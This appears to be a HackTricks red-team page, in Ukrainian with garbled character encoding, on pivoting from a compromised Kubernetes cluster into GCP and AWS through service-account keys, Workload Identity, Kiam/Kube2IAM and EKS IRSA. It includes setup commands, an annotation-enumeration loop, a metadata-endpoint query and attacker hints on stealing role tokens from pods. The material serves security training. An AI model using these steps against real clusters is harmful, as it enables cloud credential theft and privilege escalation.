# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

–Ø–∫—â–æ –≤–∏ –∑–∞–ø—É—Å–∫–∞—î—Ç–µ –∫–ª–∞—Å—Ç–µ—Ä k8s –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ GCP, –≤–∏, –Ω–∞–ø–µ–≤–Ω–æ, –∑–∞—Ö–æ—á–µ—Ç–µ, —â–æ–± –¥–µ—è–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫, —â–æ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞, –º–∞–≤ –¥–æ—Å—Ç—É–ø –¥–æ GCP. –Ñ 2 –ø–æ—à–∏—Ä–µ–Ω–∏—Ö —Å–ø–æ—Å–æ–±–∏ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ:

### –ú–æ–Ω—Ç—É–≤–∞–Ω–Ω—è –∫–ª—é—á—ñ–≤ GCP-SA —è–∫ —Å–µ–∫—Ä–µ—Ç—É

–ü–æ—à–∏—Ä–µ–Ω–∏–π —Å–ø–æ—Å—ñ–± –Ω–∞–¥–∞—Ç–∏ **–¥–æ—Å—Ç—É–ø –¥–æ kubernetes-–¥–æ–¥–∞—Ç–∫—É –¥–æ GCP**:

* –°—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ GCP
* –ü—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ –π–æ–º—É –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏
* –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ json-–∫–ª—é—á —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ SA
* –ó–∞–º–æ–Ω—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ —è–∫ —Å–µ–∫—Ä–µ—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–¥–∞
* –í—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ GOOGLE\_APPLICATION\_CREDENTIALS, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ —à–ª—è—Ö, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è json.

{% hint style="warning" %}
–û—Ç–∂–µ, —è–∫ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫**, —è–∫—â–æ –≤–∏ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É—î—Ç–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–¥–∞, –≤–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü—é **–∑–º—ñ–Ω–Ω—É** **—Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** —Ç–∞ **json** **—Ñ–∞–π–ª–∏** –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ GCP.
{% endhint %}

### –ó–≤'—è–∑—É–≤–∞–Ω–Ω—è GSA json –∑ KSA —Å–µ–∫—Ä–µ—Ç–æ–º

–°–ø–æ—Å—ñ–± –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ GSA –¥–ª—è –∫–ª–∞—Å—Ç–µ—Ä–∞ GKE - —Ü–µ –∑–≤'—è–∑–∞—Ç–∏ —ó—Ö —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:

* –°—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Kubernetes –≤ —Ç–æ–º—É –∂ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω, —â–æ –π –≤–∞—à –∫–ª–∞—Å—Ç–µ—Ä GKE, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* –°—Ç–≤–æ—Ä—ñ—Ç—å Kubernetes Secret, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ GCP, –¥–æ —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫–ª–∞—Å—Ç–µ—Ä–∞ GKE. –í–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ `gcloud`, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* –ü—Ä–∏–≤'—è–∂—ñ—Ç—å Kubernetes Secret –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ Kubernetes –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
–ù–∞ **–¥—Ä—É–≥–æ–º—É –µ—Ç–∞–ø—ñ** –±—É–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ GSA —è–∫ —Å–µ–∫—Ä–µ—Ç KSA**. –¢–æ–¥—ñ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü–µ–π —Å–µ–∫—Ä–µ—Ç** –∑ **–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** –∫–ª–∞—Å—Ç–µ—Ä–∞ **GKE**, –≤–∏ –º–æ–∂–µ—Ç–µ **–µ—Å–∫–∞–ª—é–≤–∞—Ç–∏ –¥–æ —Ü—å–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ GCP**.
{% endhint %}

### –Ü–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è GKE

–ó —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—é —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–∏ –º–æ–∂–µ–º–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ [–æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/), —â–æ–± –≤—ñ–Ω –¥—ñ—è–≤ —è–∫ [–æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Google](https://cloud.google.com/iam/docs/understanding-service-accounts). –ü–æ–¥–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Å–ª—É–∂–±–∏ Kubernetes, –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è —è–∫ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Google –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ API Google Cloud.

**–ü–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ –∫—Ä–æ–∫—ñ–≤** –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —Ü—ñ—î—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ - —Ü–µ **–∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ GCP** ([**–∫—Ä–æ–∫–∏**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) —Ç–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ GCP SA, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ, —â–æ–± k8s –Ω–∞—Å–ª—ñ–¥—É–≤–∞–≤.

* **–ê–∫—Ç–∏–≤—É–π—Ç–µ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è** –Ω–∞ –Ω–æ–≤–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **–°—Ç–≤–æ—Ä–∏—Ç–∏/–û–Ω–æ–≤–∏—Ç–∏ –Ω–æ–≤–∏–π –ø—É–ª –≤—É–∑–ª—ñ–≤** (–ö–ª–∞—Å—Ç–µ—Ä–∏ Autopilot –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å —Ü—å–æ–≥–æ)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* –°—Ç–≤–æ—Ä—ñ—Ç—å **GCP –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ –¥–ª—è –Ω–∞—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è** –∑ K8s –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ GCP:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **–ü—ñ–¥–∫–ª—é—á—ñ—Ç—å—Å—è** –¥–æ **–∫–ª–∞—Å—Ç–µ—Ä–∞** —Ç–∞ **—Å—Ç–≤–æ—Ä—ñ—Ç—å** **–æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏** –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **–ü—Ä–∏–≤'—è–∑–∞—Ç–∏ GSA –¥–æ KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* –ó–∞–ø—É—Å—Ç—ñ—Ç—å **pod** –∑ **KSA** —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–¥–æ—Å—Ç—É–ø** –¥–æ **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —É —Ä–∞–∑—ñ –ø–æ—Ç—Ä–µ–±–∏:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
–Ø–∫ –∞—Ç–∞–∫—É—é—á–∏–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ K8s, –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ **—à—É–∫–∞—Ç–∏ SAs** –∑ **–∞–Ω–æ—Ç–∞—Ü—ñ—î—é `iam.gke.io/gcp-service-account`**, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ SA –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —á–æ–≥–æ—Å—å —É GCP. –Ü–Ω—à–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç - —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –∫–æ–∂–Ω–∏–º KSA –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–∞—î –≤—ñ–Ω –¥–æ—Å—Ç—É–ø.\
–ó GCP –∑–∞–≤–∂–¥–∏ —Ü—ñ–∫–∞–≤–æ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –∑–≤'—è–∑–∫–∏ —Ç–∞ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, **—è–∫–∏–π –¥–æ—Å—Ç—É–ø –≤–∏ –Ω–∞–¥–∞—î—Ç–µ SAs –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Kubernetes**.
{% endhint %}

–¶–µ —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ª–µ–≥–∫–æ–≥–æ **–ø–µ—Ä–µ–±–æ—Ä—É –≤—Å—ñ—Ö –≤–∏–∑–Ω–∞—á–µ–Ω—å –ø–æ–¥—ñ–≤**, **—à—É–∫–∞—é—á–∏** —Ü—é **–∞–Ω–æ—Ç–∞—Ü—ñ—é**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM —Ä–æ–ª—å –¥–ª—è Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

–ó–∞—Å—Ç–∞—Ä—ñ–ª–∏–π —Å–ø–æ—Å—ñ–± –Ω–∞–¥–∞–Ω–Ω—è IAM —Ä–æ–ª–µ–π Pods - —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è [**Kiam**](https://github.com/uswitch/kiam) –∞–±–æ [**Kube2IAM**](https://github.com/jtblin/kube2iam) **—Å–µ—Ä–≤–µ—Ä–∞.** –í –æ—Å–Ω–æ–≤–Ω–æ–º—É, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ **daemonset** —É –≤–∞—à–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ –∑ **—è–∫–æ—é—Å—å –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ—é IAM —Ä–æ–ª–ª—é**. –¶–µ–π daemonset –±—É–¥–µ —Ç–∏–º, —Ö—Ç–æ –Ω–∞–¥–∞—Å—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ IAM —Ä–æ–ª–µ–π pods, —è–∫—ñ —Ü—å–æ–≥–æ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å.

–ü–æ-–ø–µ—Ä—à–µ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ **—è–∫—ñ —Ä–æ–ª—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω**, —ñ –≤–∏ —Ä–æ–±–∏—Ç–µ —Ü–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞–Ω–æ—Ç–∞—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –æ–±'—î–∫—Ç–∞ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

–Ø–∫—â–æ –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ IAM —Ä–æ–ª—è–º–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –º–∞—Ç–∏ Pods, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∫–∞–∑–∞—Ç–∏ —Ä–æ–ª—å, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è pod, –∑ —á–∏–º–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
–Ø–∫ –∞—Ç–∞–∫—É—é—á–∏–π, —è–∫—â–æ –≤–∏ **–∑–Ω–∞–π–¥–µ—Ç–µ —Ü—ñ –∞–Ω–æ—Ç–∞—Ü—ñ—ó** –≤ –ø–æ–¥–∞—Ö –∞–±–æ –ø—Ä–æ—Å—Ç–æ—Ä–∞—Ö —ñ–º–µ–Ω, –∞–±–æ —Å–µ—Ä–≤–µ—Ä kiam/kube2iam, —â–æ –ø—Ä–∞—Ü—é—î (–π–º–æ–≤—ñ—Ä–Ω–æ, –≤ kube-system), –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–¥–∞–≤–∞—Ç–∏—Å—å** –≤ –∫–æ–∂–Ω—É —Ä–æ–ª—å, —è–∫–∞ –≤–∂–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–æ–¥–∞–º–∏**, —ñ –±—ñ–ª—å—à–µ (—è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS, –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Ä–æ–ª—ñ).
{% endhint %}

#### –°—Ç–≤–æ—Ä–∏—Ç–∏ Pod –∑ IAM —Ä–æ–ª–ª—é

{% hint style="info" %}
IAM —Ä–æ–ª—å, —è–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑–∞—Ç–∏, –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –≤ —Ç–æ–º—É –∂ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS, —â–æ –π —Ä–æ–ª—å kiam/kube2iam, —ñ —Ü—è —Ä–æ–ª—å –ø–æ–≤–∏–Ω–Ω–∞ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω–µ—ó –¥–æ—Å—Ç—É–ø.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

–¶–µ **—Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–∏–π —Å–ø–æ—Å—ñ–± –≤—ñ–¥ AWS**.

1. –ü–æ-–ø–µ—Ä—à–µ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ [—Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ OIDC –¥–ª—è –∫–ª–∞—Å—Ç–µ—Ä–∞](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. –ü–æ—Ç—ñ–º –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ IAM —Ä–æ–ª—å –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏, —è–∫—ñ –±—É–¥–µ –≤–∏–º–∞–≥–∞—Ç–∏ SA.
3. –°—Ç–≤–æ—Ä—ñ—Ç—å [–≤—ñ–¥–Ω–æ—Å–∏–Ω–∏ –¥–æ–≤—ñ—Ä–∏ –º—ñ–∂ IAM —Ä–æ–ª–ª—é —Ç–∞ SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) –Ω–∞–∑–≤–æ—é (–∞–±–æ –ø—Ä–æ—Å—Ç–æ—Ä–∞–º–∏ —ñ–º–µ–Ω, —è–∫—ñ –Ω–∞–¥–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Ä–æ–ª—ñ –≤—Å—ñ–º SA –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω). _–í—ñ–¥–Ω–æ—Å–∏–Ω–∏ –¥–æ–≤—ñ—Ä–∏ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏–º—É—Ç—å –Ω–∞–∑–≤—É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ OIDC, –Ω–∞–∑–≤—É –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω —Ç–∞ –Ω–∞–∑–≤—É SA_.
4. –ù–∞—Ä–µ—à—Ç—ñ, **—Å—Ç–≤–æ—Ä—ñ—Ç—å SA –∑ –∞–Ω–æ—Ç–∞—Ü—ñ—î—é, —â–æ –≤–∫–∞–∑—É—î ARN —Ä–æ–ª—ñ**, —ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑ —Ü–∏–º SA, –º–∞—Ç–∏–º—É—Ç—å **–¥–æ—Å—Ç—É–ø –¥–æ —Ç–æ–∫–µ–Ω–∞ —Ä–æ–ª—ñ**. **–¢–æ–∫–µ–Ω** **–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è** —É —Ñ–∞–π–ª, –∞ —à–ª—è—Ö –≤–∫–∞–∑—É—î—Ç—å—Å—è –≤ **`AWS_WEB_IDENTITY_TOKEN_FILE`** (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
–©–æ–± **–æ—Ç—Ä–∏–º–∞—Ç–∏ aws, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω** –∑ `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, –≤–∏–∫–æ–Ω–∞–π—Ç–µ: 

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
–Ø–∫ –∞—Ç–∞–∫—É—é—á–∏–π, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –∫–ª–∞—Å—Ç–µ—Ä K8s, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å **–æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±–∏ –∑ —Ü—ñ—î—é –∞–Ω–æ—Ç–∞—Ü—ñ—î—é**, —â–æ–± **–µ—Å–∫–∞–ª—é–≤–∞—Ç–∏ –¥–æ AWS**. –î–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Å—Ç–æ **exec/create** **pod**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–¥–∏–Ω –∑ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±–∏ IAM**, —ñ –≤–∫—Ä–∞–¥—ñ—Ç—å —Ç–æ–∫–µ–Ω.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ –≤–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ pod, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, —Ç–∞–∫—ñ —è–∫ **AWS\_ROLE\_ARN** —Ç–∞ **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
